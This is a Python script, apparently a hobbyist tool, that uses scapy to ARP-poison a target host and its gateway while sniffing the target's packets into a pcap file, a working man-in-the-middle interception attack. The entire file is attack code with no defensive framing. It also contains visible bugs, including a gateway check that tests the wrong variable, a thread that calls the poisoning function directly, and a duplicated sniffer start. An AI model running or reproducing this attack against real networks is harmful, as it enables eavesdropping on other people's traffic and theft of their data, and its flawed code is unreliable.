import os
import sys
import threading
from scapy.all import *

def get_mac(ip_address):
        
        responses, unanreson = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address),timeout=1 ,retry=10)
        
        for s,r in responses:
                return r[Ether].src
        
        return None

def arp_posion(target_ip,target_mac,gateway_ip,gateway_mac):
        
        posion_target        = ARP()
        posion_target.op     = 2
        posion_target.psrc   = gateway_ip
        posion_target.pdst   = target_ip
        posion_target.hwdst  = target_mac
        
        posion_gateway       = ARP()
        posion_gateway.op    = 2
        posion_gateway.psrc  = target_ip
        posion_gateway.pdst  = gateway_ip
        posion_gateway.hwdst = gateway_mac
        
        
        print ("[*] Startting ARP POSION..... [CTRL + C STOP]")
        while True:
                try:
                        send(posion_gateway)
                        send(posion_target)
                        
                        time.sleep(1)
                        
                except KeyboardInterrupt:
                        print ("[!!] ARP posion Finead.")
                        sys.exit()
        return


def sniffer(interface,connect,target_ip):
        print ("[*] Startting sniffer.....")
        try:
                filterd = "ip host %s" % target_ip
                packets = sniff(count=connect,filter=filterd, iface=interface)
                wrpcap('arp.pcap',packets)
                
        except KeyboardInterrupt:
                pass                



        return

def main():
        print ("-------ARP POSTION-------")
        
        target_ip  = input("Input target IP: ")
        target_mac = get_mac(target_ip)
        
        if target_mac == None:
                print ("[!!] Target MAC no find")
                sys.exit()
        else:
                print ("[*] Target MAC is  %s " % (target_mac))      
        
        gateway_ip  = input("Input gateway IP: ")
        gateway_mac = get_mac(gateway_ip)
        
        if target_mac == None:
                print ("[!!] Gateway MAC no find")
                sys.exit()
        else:
                print ("[*] Gateway MAC is %s " % (gateway_mac))
                
                
        conf.verb = 0
        interface = conf.iface
        
        print ("Sniff interface at %s" % (interface))
        
        connect = int(input("Input sniffer connect: "))
        
        sniffer_thread = threading.Thread(target=sniffer,args=(interface,connect,target_ip))
        sniffer_thread.start()        
        
        arp_thread = threading.Thread(target=arp_posion,args=(arp_posion(target_ip,target_mac,gateway_ip,gateway_mac)))
        arp_thread.start()
                                      
        sniffer_thread = threading.Thread(target=sniffer,args=(interface,connect,target_ip))
        sniffer_thread.start()
        
        return
        
        
main()